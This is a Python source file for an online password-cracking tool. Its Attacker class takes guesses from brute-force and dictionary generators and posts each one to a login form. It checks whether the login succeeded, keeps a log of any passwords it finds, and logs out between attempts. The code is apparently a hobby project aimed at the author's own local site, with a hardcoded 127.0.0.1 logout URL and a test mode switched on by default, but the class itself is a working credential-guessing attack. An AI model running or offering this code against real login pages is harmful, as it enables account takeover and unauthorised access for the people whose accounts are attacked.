from PasswordCracker.PasswordAttackTypes import BruteForceAttack, DictionaryAttack

import requests
import time


class Attacker():
    def __init__(self, loginURL, logoutURL, formTags=None, attackMethods=None):

        # url of the login page
        self.loginURL = loginURL

        # url of logout page
        self.logoutURL = logoutURL

        # Layout of the login form. You can check this through inspect element.
        # Or if you built the website you can check the code!
        self.formTags = formTags or ["Username", "Password"]

        # By default this is set to:
        # {
        #   "Username" : "dummy",
        #   "Password" : "dummy"
        # }
        self.data = {
            self.formTags[0]:"dummy", # form id for username
            self.formTags[1]:"dummy" # form id for password
        }

        # list of attack methods
        # You can write your own class but it must contain a generatePasswords() method that returns an iterator of guesses
        self.attackMethods = attackMethods or {"BruteForceAttack":BruteForceAttack(),
                                               "DictionaryAttack":DictionaryAttack()}

    # runs attack on the website.
    # successful is a function that the user provides that returns whether the login succeeded or not.
    # def successful(response) -> Boolean
    # this will change for depending on how the website is constructed. For mine just check that "HELLO" is present in response.content
    def runAttack(self, checkSuccess, attackMethods=None, username=None,
                  findAll=False, testMode=True, verbose=False, log=False):
        print("ATTACKING", self.loginURL)

        # stores password've we cracked
        foundPasswords = set({})

        # can specify which attack methods to use
        # if not specified, use all that are loaded in
        if not attackMethods:
            attackMethods = [name for name in self.attackMethods]

        with requests.Session() as session:


            for name, attackMethod in self.attackMethods.items():

                # skip if we don't want to run a particular mode
                if name not in attackMethods:
                    continue

                # if we are logging, remove the old log file
                if log:
                    open(name + ".txt", 'w').close()

                startTime = time.time()
                print("=========================================================================\n" + str(attackMethod))

                # logging if needed
                with open(name + ".txt", 'a') as file:
                    file.write("%s\n\n" % str(attackMethod))

                    count = 0
                    for password in attackMethod.generatePasswords():
                        count += 1
                        if testMode:
                            if verbose:
                                print("TEST MODE: generated password [%s]" % password)
                            continue

                        # if username is not passed as argument, we will user the password as our username
                        self.setDataFields(username, password)

                        response = session.post(self.loginURL, data=self.data)
                        found = checkSuccess(response)

                        if verbose:
                            print("Trying [%s] ... %s" % (password, "SUCCESS" if found else "FAILED"))

                        if found:
                            file.write(password + "\n")

                            if not verbose:
                                print("Found [%s]" % password)
                            foundPasswords.add(password)

                            # if we are just brute forcing a single username exit after we found it
                            if not findAll:
                                break

                        session.get("http://127.0.0.1:5000/logout")

                    results = "%s generated %d passwords in %s ms. Found %d password:" \
                              % (name, count, time.time() - startTime, len(foundPasswords))

                    # log results
                    if log:
                        file.write(results)

                    print(results)

                for pw in foundPasswords:
                    print(pw)

                print("=========================================================================\n")

        return foundPasswords

    def setDataFields(self, username, password):
        self.data[self.formTags[0]] = username or password
        self.data[self.formTags[1]] = password

    def getPasswords(self):
        result = []
        for attackMethod in self.attackMethods:
            print(attackMethod)
            result += attackMethod.generatePasswords()

        return result

    def addAttackMethod(self, method):
        self.attackMethods[type(method).__name__] = method

    def getAttackMethod(self, method):
        if method in self.attackMethods:
            return self.attackMethods[method]

